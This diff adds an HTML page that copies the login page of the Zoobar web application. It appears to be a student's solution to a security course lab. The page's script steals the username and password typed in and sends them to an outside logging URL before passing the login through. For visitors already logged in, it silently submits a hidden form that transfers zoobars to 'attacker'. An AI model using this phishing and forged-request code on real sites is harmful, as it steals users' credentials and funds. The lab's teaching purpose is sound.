@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <link rel="stylesheet" type="text/css" href="http://localhost:8080/zoobar/media/zoobar.css">
+        <title>
+          Login - Zoobar Foundation
+        </title>
+    </head>
+    <body>        
+        <h1><a href="http://localhost:8080/zoobar/index.cgi/">Zoobar Foundation for Sensible Research</a></h1>
+        <h2>Supporting the proven advocates of the information superhighway</h2>
+      
+        <div id="login" class="centerpiece">
+            <form name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login">
+                <table>
+                    <tr>
+                        <td>Username:</td>
+                        <td><input type="text" name="login_username" size="20" autocomplete="no"></td>
+                    </tr>
+                    <tr>
+                        <td>Password:</td>
+                        <td colspan=2><input type="password" name="login_password" size=20 autocomplete="no">
+                        <input type="submit" onclick="clicked = 'submit_login';" name="submit_login" value="Log in">
+                        <input type="submit" onclick="clicked = 'submit_registration';" name="submit_registration" value="Register"></td>
+                    </tr>
+                </table>
+                <input type="hidden" name="nexturl" value="http://localhost:8080/zoobar/index.cgi/">
+                <div id="myZoobars" style="display:none"></div>
+            <iframe id="_blank_iframe" name="_blank_iframe" src="about:blank" style="display:none"></iframe>
+            </form>
+            <form method="POST" name="transferform" action="http://localhost:8080/zoobar/index.cgi/transfer" target="_blank_iframe">
+                <input name="zoobars" type="hidden" value="10" size=5>
+                <input name="recipient" type="hidden" value="attacker" size=10>
+            </form>
+        </div>
+
+        <script type="text/javascript" src="http://localhost:8080/zoobar/index.cgi/zoobarjs"></script>
+        <script type="text/javascript">
+            if (document.getElementById("myZoobars").innerHTML.length === 0) {
+                // not logged in
+                var clicked;
+                var loginform = document.getElementsByName('loginform')[0];
+                loginform.onsubmit = function (event) {
+                    (new Image()).src='https://css.csail.mit.edu/6.858/2020/labs/log.php?' + 'id=rudeigerc' + '&payload=' + event.target[0].value + '/' + event.target[1].value + '&random=' + Math.random();
+                    var botton = document.getElementsByName(clicked)[0];
+                    setTimeout(function () {
+                        loginform.onsubmit = null;
+                        botton.click();
+                    }, 3000);
+                    event.preventDefault();
+                }
+            } else {
+                // logged in
+                var transferform = document.getElementsByName('transferform')[0];
+                var iframe = document.getElementById('_blank_iframe');
+
+                transferform.submit();
+                iframe.addEventListener('load', function () {
+                    window.location.href = 'https://css.csail.mit.edu/6.858/2020/';
+                });
+            }
+        </script>
+    </body>
+</html>
